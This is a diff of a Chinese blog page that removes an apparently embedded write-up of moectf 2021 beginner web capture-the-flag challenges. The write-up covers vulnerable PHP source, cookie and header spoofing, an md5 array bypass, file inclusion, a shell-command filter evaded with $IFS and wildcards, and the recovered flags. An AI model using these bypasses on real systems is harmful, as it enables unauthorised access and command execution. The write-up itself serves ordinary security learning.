-      <meta itemprop="description" content="为什么不拉弟弟一把呢">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="灵能对抗实验室">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/01/2021-11-1-1wp/" class="post-title-link" itemprop="url">moectf_web_wp</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-11-01 15:18:32 / 修改时间：15:22:13" itemprop="dateCreated datePublished" datetime="2021-11-01T15:18:32+08:00">2021-11-01</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="1-moectf-web"><a href="#1-moectf-web" class="headerlink" title="1-moectf-web"></a>1-moectf-web</h2><h3 id="1-GET"><a href="#1-GET" class="headerlink" title="1  GET"></a>1  GET</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">## source</span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$moe = $_GET[&#x27;moe&#x27;];</span><br><span class="line">if ($moe == &quot;flag&quot;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exp:</span><br><span class="line">url?moe=flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-POST"><a href="#2-POST" class="headerlink" title="2 POST"></a>2 POST</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">## source</span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">$moe = $_POST[&#x27;moe&#x27;];</span><br><span class="line">if ($moe == &quot;flag&quot;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">exp:</span><br><span class="line">POST /</span><br><span class="line">moe=flag</span><br><span class="line">(1)html表单</span><br><span class="line">(2)burp</span><br><span class="line">(3)python</span><br><span class="line"># coding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">url = &#x27;http://47.93.215.154:10001/&#x27; </span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, # Burp</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&#x27;      </span><br><span class="line">          &#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;moe&#x27;:&#x27;flag&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers);</span><br><span class="line">r.encoding = &#x27;utf-8&#x27;</span><br><span class="line">print(&quot;POST url:&quot;)</span><br><span class="line">print(url)</span><br><span class="line">print(&#x27;------------------------------------&#x27;)</span><br><span class="line">print(&quot;&gt;&gt;&gt; r.text:&quot;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-小饼干"><a href="#3-小饼干" class="headerlink" title="3 小饼干"></a>3 小饼干</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">## tips</span><br><span class="line">You are not VIP,I will give flag to VIP!</span><br><span class="line">## Burp &amp; python</span><br><span class="line">（1）观察第2个请求包头部 </span><br><span class="line">     Cookie: VIP=0</span><br><span class="line">（2）把第一个包 Send to Repeater</span><br><span class="line"> (3) 在Host: 头部之后添加 (Cookie: VIP=1不能加在头部字段最后面)</span><br><span class="line">    Cookie: VIP=1</span><br><span class="line">    GO</span><br><span class="line">## python</span><br><span class="line"># coding: utf-8</span><br><span class="line">import requests</span><br><span class="line">url = &#x27;http://47.93.215.154:10002/&#x27;</span><br><span class="line">headers=&#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&#x27;,</span><br><span class="line">    &#x27;Cookie&#x27;: &#x27;VIP=1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">params=&#123;&#x27;a&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">r = requests.get(</span><br><span class="line">    url=url,</span><br><span class="line">    params=params,</span><br><span class="line">    headers=headers</span><br><span class="line">    )</span><br><span class="line">r.encoding = &#x27;utf-8&#x27;</span><br><span class="line">print(&quot;&gt;&gt;&gt; r.headers:&quot;)</span><br><span class="line">print(r.headers)</span><br><span class="line">print(&quot;&gt;&gt;&gt; r.status_code:&quot;)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(&quot;&gt;&gt;&gt; r.text:&quot;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2048"><a href="#4-2048" class="headerlink" title="4 2048"></a>4 2048</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">## F2 ==&gt; source  </span><br><span class="line">// Ctrl+F ==&gt; flag</span><br><span class="line"> getFlag: function() &#123;</span><br><span class="line">        var req = new XMLHttpRequest;</span><br><span class="line">        req.open(&quot;GET&quot;,&quot;flag.php?score=&quot;+obj.score,true);</span><br><span class="line">        req.onload = function() &#123;</span><br><span class="line">            alert(this.responseText);</span><br><span class="line">            &#125;</span><br><span class="line">        req.send();</span><br><span class="line">      &#125;</span><br><span class="line">## exp</span><br><span class="line">/flag.php?score=1000000</span><br><span class="line">==&gt;  flag moectf&#123;2048_1s_intere5t1ng!&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-get-post-md5"><a href="#5-get-post-md5" class="headerlink" title="5 get-post-md5"></a>5 get-post-<strong>md5</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_POST[&#x27;b&#x27;];</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">    if($a!=$b&amp;&amp;md5($a)===md5($b))&#123;</span><br><span class="line">        include_once &quot;flag&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;try again&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## exp</span><br><span class="line">a[]=1</span><br><span class="line">b[]=2</span><br><span class="line"></span><br><span class="line">url = &#x27;http://47.98.215.112:78/?a[]=1&#x27; </span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, # Burp</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&#x27;    </span><br><span class="line">          &#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;b[]&#x27;:&#x27;2&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">r = requests.post(url,data=data,headers=headers);</span><br><span class="line">r.encoding = &#x27;utf-8&#x27;</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="6-ezinclude"><a href="#6-ezinclude" class="headerlink" title="6 ezinclude"></a>6 ezinclude</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">## index.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">## exp</span><br><span class="line">http://47.98.215.112:5000/?file=flag.php</span><br><span class="line">===&gt; 空白</span><br><span class="line">F12 ==&gt; &lt;?$flag=&quot;moectf&#123;xdsec6asdgas7ahfsfaxczc&#125;&quot;;?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-Do-you-know-HTTP"><a href="#7-Do-you-know-HTTP" class="headerlink" title="7 Do you know HTTP"></a>7 Do you know HTTP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">## Burp</span><br><span class="line"> (1) GET  改为 ==&gt; HS</span><br><span class="line"> ==&gt; 只有本地ip地址才可以哦！ </span><br><span class="line"> ## 乱码 ==&gt; cyberchef ==&gt; Text Encoding Brute Force</span><br><span class="line"> // ISO-8859-1 Latin 1 Western European (28591)</span><br><span class="line"> (2) 增加头部字段 (Host之后)</span><br><span class="line">  X-Forwarded-For:127.0.0.1</span><br><span class="line">  ==&gt; 我希望你是从&#x27;www.ltyyds.com&#x27;过来的！</span><br><span class="line">  ## 乱码 ==&gt; cyberchef ==&gt; Text Encoding Brute Force</span><br><span class="line"> (3) 增加头部字段</span><br><span class="line"> Referer:www.ltyyds.com</span><br><span class="line"> ==&gt;&#x27;LT&#x27;才是本题官方浏览器哦！</span><br><span class="line">想要得到flag，就用官方浏览器吧！</span><br><span class="line">(4) 修改头部字段</span><br><span class="line">User-Agent:LT </span><br><span class="line">==&gt; moectf&#123;HTTPHeaders_1s_s0_ea5y!&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-地狱通信"><a href="#8-地狱通信" class="headerlink" title="8 地狱通信"></a>8 地狱通信</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">## http://81.68.112.139:12345/</span><br><span class="line">==&gt; The page you requested cannot be found right now. Try at 24:00.</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn</span><br><span class="line">Date: Tue, 10 Aug 2021 06:36:59 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 754</span><br><span class="line">## HTTP 头部大全</span><br><span class="line">Date: Mon, 9 Aug 2021 24:00:00 GMT</span><br></pre></td></tr></table></figure>
-
-<h3 id="9-babeRCE"><a href="#9-babeRCE" class="headerlink" title="9 babeRCE"></a>9 babeRCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">## index.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$rce = $_GET[&#x27;rce&#x27;];</span><br><span class="line">if (isset($rce)) &#123;</span><br><span class="line">    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;, $rce)) &#123;</span><br><span class="line">        system($rce);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        echo &quot;hhhhhhacker!!!&quot;.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## exp</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">params=&#123;&#x27;rce&#x27;:&#x27;grep$IFS&#123;$IFS./f??g.php$IFS&#x27;&#125;</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">http://47.93.215.154:5000/?rce=w</span><br><span class="line">/?rce=ls ==&gt; flag.php index.php</span><br><span class="line">/?rce=l\s ==&gt; ok</span><br><span class="line">/?rce=c\a\t ==&gt; OK</span><br><span class="line">http://47.93.215.154:5000/?rce=ls$IFS-al</span><br><span class="line">==&gt; OK</span><br><span class="line">http://47.93.215.154:5000/?rce=strings$IFSfl??.php</span><br><span class="line"></span><br><span class="line">pwd ==&gt; /app</span><br><span class="line">id ==&gt; uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">date </span><br><span class="line">ls -al ../ ==&gt; 755</span><br><span class="line">ls -al ==&gt; 755</span><br><span class="line">ls -al /bin ==&gt; command</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1210,7 +1263,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">30</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
